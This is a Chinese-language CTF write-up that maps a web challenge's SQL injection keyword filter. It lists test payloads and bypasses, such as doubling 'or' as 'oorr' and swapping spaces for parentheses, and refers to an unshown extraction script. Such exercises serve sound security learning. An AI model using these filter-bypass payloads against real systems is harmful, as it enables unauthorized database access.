1、认真一点

(-1)关键词表       

[注]该表是根据下面一步步推断出的，之所以放在最前面是方便sql注入的过程中查阅。

| 关键词 | 正常 | 标记 | 过滤 | 代替方案 | 备注             |
| ------ | ---- | ---- | ---- | -------- | ---------------- |
| 单引号 | 是   |      |      |          |                  |
| or     |      |      | 是   | oorr     |                  |
| union  |      | 是   |      |          |                  |
| and    | 是   |      |      |          |                  |
| 空格   |      | 是   |      | 括号     | 在单引号外被标记 |
| \#     |      | 是   |      |          |                  |
| /**/   |      |      | 是   |          |                  |
| %      |      | 是   |      |          |                  |
| select |      |      | 是   |          |                  |
| order  | 是   |      |      |          |                  |
| by     | 是   |      |      |          |                  |
|        |      |      |      |          |                  |

(1)回显

正确错误结果会回显，会额外发现sql注入，不直接回显报错

故约定，返回正确则对，报错或者返回错误则不对，关键词出现sql注入则该关键词被标记(非过滤)。

```
id=1 #对
0，2#均不对
1 union #sql
```

(2)类型

字符型,且用单引号(单引号既没被过滤也没被标记)

select * from table_name where id =''

```
id=1abc #返回错误
1` 对
1' #不对
```

(2)注释判断

\#被完全标记,—没被标记但可能被过滤

``` 
1'--%20#不对
1 #  #sql
1'%23 #sql
```

(3)绕过单引号

由于注释被标记或过滤，所以得绕过引号

```
1'or'1 #对
```

(4)判断被过滤和标记的关键词

a.空格,or

```
空格：
1' or '1 #sql
1'/**/or'1 #不对
1'or('1')or'1 #不对
```

空格没法被绕过怎么办,引号，注释，括号三种代替方案都不对。

是不是or特殊或者单引号特殊？

测试or:

```
1'oror'1 #对
1'ororor'1 #对
1'oorr'1 #对
1'ooorrr'1 #不对
```

看来or确实被过滤了，用外层重写方式绕过即可。再次判断：

```
1'/**/Oorr'1 #不对
1'oorr(1)oorr'1 #对
```

所以空格可以用括号绕过

b.select,and,%,union,order,by

```
1select #sql
1and #sql
1%  #sql
1union #sql
1order #对
1by #对
```

(5)写脚本破解表名，列名等。
参见renzhenyidian.py









